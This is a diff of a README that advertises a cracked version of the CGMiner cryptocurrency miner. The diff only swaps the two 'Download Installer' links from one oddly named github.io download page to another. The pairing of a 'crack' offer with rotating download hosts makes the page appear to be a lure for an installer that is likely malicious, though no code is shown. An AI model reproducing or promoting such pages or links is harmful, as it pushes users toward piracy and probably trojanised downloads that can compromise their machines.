@@ -2,7 +2,7 @@
 
 CGMiner is a widely-used cryptocurrency mining software that supports various algorithms and hardware. This repository provides an optimized version of CGMiner with advanced overclocking tools, designed specifically for Windows 10 and 11 users. With CGMiner crack, you can access all premium features without restrictions, ensuring maximum mining performance in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -62,6 +62,6 @@ A: Download the new installer from the link provided and run it; it will automat
 ## Download
 
 For the latest version and updates, please visit the official download page:
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This package is provided as-is, and users are responsible for ensuring compliance with all applicable laws and regulations. Last updated: 2026.
